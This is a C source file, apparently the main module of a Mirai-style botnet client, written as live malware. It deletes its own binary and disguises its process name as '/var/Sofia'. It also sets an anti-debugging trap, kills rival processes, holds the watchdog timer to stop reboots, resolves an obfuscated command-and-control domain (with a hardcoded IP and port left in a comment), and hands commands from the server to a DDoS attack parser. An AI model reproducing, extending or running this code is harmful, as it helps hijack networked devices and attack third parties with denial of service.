#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>
#include <linux/limits.h>
#include <string.h>
#include <dirent.h>

#include "includes.h"
#include "table.h"
#include "rand.h"
#include "attack.h"
#include "killer.h"
#include "util.h"
#include "resolv.h"
//#include "scanner.h"

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static BOOL unlock_tbl_if_nodebug(char *);
static void ensure_single_instance(void);

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1, num_tries = 0, main_pid, watchdog_scanner_pid = 0, tfd = -1;
BOOL pending_connection = FALSE;
void (*resolve_func)(void) = (void (*)(void))util_local_addr;

#ifdef DEBUG
static void segv_handler(int sig, siginfo_t *si, void *unused)
{
    printf("[main] Got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
    exit(EXIT_FAILURE);
}
#endif

static void maintain_watchdog_driver(char *fn, char *dir_to_scan)
{
    watchdog_scanner_pid = fork();
    if(watchdog_scanner_pid > 0 || watchdog_scanner_pid == -1)
        return;

    int watchdog_fd = 0;
    int timeout = 1;
    char buf[256];
    char watchdog_found = FALSE;

    strcpy(buf, dir_to_scan);
    strcat(buf, "/");
    strcat(buf, fn);

    if((watchdog_fd = open(buf, 2)) != -1)
    {
    	#ifdef DEBUG
    	printf("[watchdog] Opened potential watchdog driver %s\n", buf);
    	#endif

    	// Attempt to message the drivers ioctl interface
    	ioctl(watchdog_fd, WDIOC_SETOPTIONS, &timeout);
    	watchdog_found = TRUE;
    }

    if(!watchdog_found)
    {
    	#ifdef DEBUG
    	printf("[watchdog] Broadcasting to the watchdog driver(s) (%s) ioctl interface\n", buf);
    	#endif
        while(TRUE)
        {
        	#ifdef DEBUG
        	printf("[watchdog] Sending ioctl call to the interface (%s)...\n", buf);
        	#endif
            ioctl(watchdog_fd, WDIOC_KEEPALIVE, 0);
            sleep(5);
        }
    }

    #ifdef DEBUG
    printf("[watchdog] Failed to open the watchdog driver (%s)\n", buf);
    #endif

    exit(0);
}

void find_watchdog_driver(char *dir_to_scan)
{
    watchdog_scanner_pid = fork();
	if(watchdog_scanner_pid > 0 || watchdog_scanner_pid == -1)
		return;

    sleep(1);

	#ifdef DEBUG
	printf("[watchdog] Scanning for watchdog driver...\n");
	#endif

	DIR *dir;
    struct dirent *file;

    if((dir = opendir(dir_to_scan)) == NULL)
    {
        #ifdef DEBUG
      	printf("[watchdog] Failed to open\n");
       	#endif
        exit(0);
    }

    while((file = readdir(dir)) != NULL)
    {
        // No such directory or file
       	if(*(file->d_name) == '.')
       	    continue;

       	#ifdef DEBUG
       	printf("[watchdog] Scanning %s\n", file->d_name);
       	#endif

        // Check for string name
       	if(strstr(file->d_name, "watchdog") || strstr(file->d_name, "Watchdog") || strstr(file->d_name, "WatchDog"))
       	{
       	    #ifdef DEBUG
       		printf("[watchdog] Found file that matches the string 'watchdog' (%s)\n", file->d_name);
       		#endif
       		maintain_watchdog_driver(file->d_name, dir_to_scan);
       		break;
       	}

       	sleep(1);
    }

    closedir(dir);
    exit(0);
}

void kill_watchdog_maintainer(void)
{
    kill(watchdog_scanner_pid, 9);
}

static void flush(void)
{
    char buf[4096];
    int len = 0;
    int gfd = -1;

    if((len = readlink("/proc/self/exe", buf, sizeof(buf) - 1)) == -1)
    {
        return;
    }

    unlink(buf);

    if((gfd = open(buf, O_CREAT|O_WRONLY|O_TRUNC, 0777)) == -1)
    {
        return;
    }

    close(gfd);
    return;
}


int main(int argc, char **args)
{
    char id_buf[32], *tbl_exec_succ, *name_buf; //name_buf[32];
    int name_buf_len, tbl_exec_succ_len, pgid, pings = 0;

    #ifndef DEBUG
    sigset_t sigs;
    int wfd;

    sigemptyset(&sigs);
    sigaddset(&sigs, SIGINT);
    sigprocmask(SIG_BLOCK, &sigs, NULL);
    signal(SIGCHLD, SIG_IGN);
    signal(SIGTRAP, &anti_gdb_entry);
    #endif

    #ifdef DEBUG
    printf("DEBUG MODE YO\n");

    struct sigaction sa;
    sa.sa_flags = SA_SIGINFO;

    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segv_handler;
    if (sigaction(SIGSEGV, &sa, NULL) == -1)
        perror("sigaction");

    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segv_handler;
    if (sigaction(SIGBUS, &sa, NULL) == -1)
        perror("sigaction");
    #endif

    LOCAL_ADDR = util_local_addr();

    table_init();
    anti_gdb_entry(0);
    ensure_single_instance();
    rand_init();

    #ifndef DEBUG
    flush();
    #endif

    util_zero(id_buf, 32);
    if (argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }
    else
        util_strcpy(id_buf, "h");

    /*name_buf_len = ((rand_next() % 4) + 3) * 4;
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    util_strcpy(args[0], name_buf);

    name_buf_len = ((rand_next() % 6) + 3) * 4;
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    prctl(PR_SET_NAME, name_buf);*/

    // did this on purpose I don't want being killed on cmdline

    name_buf = "/var/Sofia";
    util_strcpy(args[0], name_buf);
    prctl(PR_SET_NAME, name_buf);

    write(STDOUT, "0x00000e9\n", 10);

    #ifndef DEBUG
    if (fork() > 0)
        return 0;

    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
    #endif

    killer_kill_by_port(htons(21065));

    attack_init();
    find_watchdog_driver("/dev");
    //scanner_init();
    //killer_tcp_init(args[0]);

    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        // Socket for accept()
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        // Set up CNC sockets
        if (fd_serv == -1)
            establish_connection();

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        // Get maximum FD for select
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        // Wait 10s in call to select()
        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
            #ifdef DEBUG
            printf("select() errno = %d\n", errno);
            #endif
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;

            if (pings++ % 6 == 0)
                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
        }

        // Check if we need to kill ourselves
        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
        {
            struct sockaddr_in cli_addr;
            socklen_t cli_addr_len = sizeof (cli_addr);

            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);

			#ifdef DEBUG
            printf("[main] Detected newer instance running! Killing self\n");
			#endif

            killer_kill();
            //scanner_kill();
            kill_watchdog_maintainer();

            kill(pgid * -1, 9);
            exit(0);
        }

        // Check if CNC connection was established or timed out or errored
        if (pending_connection)
        {
            pending_connection = FALSE;

            if (!FD_ISSET(fd_serv, &fdsetwr))
            {
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof (err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err != 0)
                {
                    teardown_connection();
                }
                else
                {
                    LOCAL_ADDR = util_local_addr();
                    char sendbuf[64];
                    uint8_t id_len = util_strlen(id_buf);
                    util_zero(sendbuf, 64);
                    util_memcpy(sendbuf, "\x12\x13\x14\x15", 4);
                    util_memcpy(sendbuf + 4, &id_len, sizeof(uint16_t));
                    util_memcpy(sendbuf + 4 + sizeof(uint8_t), id_buf, id_len);
                    send(fd_serv, sendbuf, 4 + sizeof(uint8_t) + id_len, MSG_NOSIGNAL);
                    util_zero(sendbuf, 64);
					#ifdef DEBUG
                    printf("[main] Connected to CNC. Local address = %d\n", LOCAL_ADDR);
					#endif
                }
            }
        }

        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n;
            char rdbuf[1024];

            errno = 0;
            n = recv(fd_serv, rdbuf, sizeof(rdbuf), MSG_NOSIGNAL);
            if (n <= 0)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                {
                    teardown_connection();
                    continue;
                }
            }

			#ifdef DEBUG
            printf("[main] Received %d bytes from CNC\n", n);
			#endif

            if (n > 0)
            {
                if (rdbuf[0] == '\x12' && rdbuf[1] == '\x13' && rdbuf[2] == '\x14' && rdbuf[3] == '\x15')
                {
					#ifdef DEBUG
                    printf("[main] ping received from cnc\n");
					#endif
                    util_zero(rdbuf, sizeof(rdbuf));
                    continue;
                }
                else
                    attack_parse(rdbuf, n);
            }

            util_zero(rdbuf, sizeof(rdbuf));
        }
    }

    return 0;
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
    /*srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = INET_ADDR(206,166,251,6);
    srv_addr.sin_port = htons(17691);*/

    table_unlock_val(TABLE_CNC_DOMAIN);
    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
    table_lock_val(TABLE_CNC_DOMAIN);

    if (entries == NULL)
    {
        return;
    }

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    srv_addr.sin_port = htons(17691);
    resolv_entries_free(entries);
}

static void establish_connection(void)
{
    #ifdef DEBUG
    printf("[main] Attempting to connect to CNC\n");
    #endif

    if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        #ifdef DEBUG
        printf("[main] Failed to call socket(). Errno = %d\n", errno);
        #endif
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    // Should call resolve_cnc_addr
    if (resolve_func != NULL)
        resolve_func();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
}

static void teardown_connection(void)
{
    if (fd_serv != -1)
        close(fd_serv);
    fd_serv = -1;
    sleep((rand_next() % 10) + 1);
}

static void ensure_single_instance(void)
{
    static BOOL local_bind = TRUE;
    struct sockaddr_in addr;
    int opt = 1;

    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;
    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof (int));
    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127,0,0,1)) : LOCAL_ADDR;
    addr.sin_port = htons(SINGLE_INSTANCE_PORT);

    // Try to bind to the control port
    errno = 0;
    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
        if (errno == EADDRNOTAVAIL && local_bind)
            local_bind = FALSE;
#ifdef DEBUG
        printf("[main] Another instance is already running (errno = %d)! Sending kill request...\r\n", errno);
#endif

        // Reset addr just in case
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(SINGLE_INSTANCE_PORT);

        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("[main] Failed to connect to fd_ctrl to request process termination\n");
#endif
        }

        sleep(5);
        close(fd_ctrl);
        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
        ensure_single_instance(); // Call again, so that we are now the control
    }
    else
    {
        if (listen(fd_ctrl, 1) == -1)
        {
#ifdef DEBUG
            printf("[main] Failed to call listen() on fd_ctrl\n");
            close(fd_ctrl);
            sleep(5);
            killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
            ensure_single_instance();
#endif
        }
    }
}

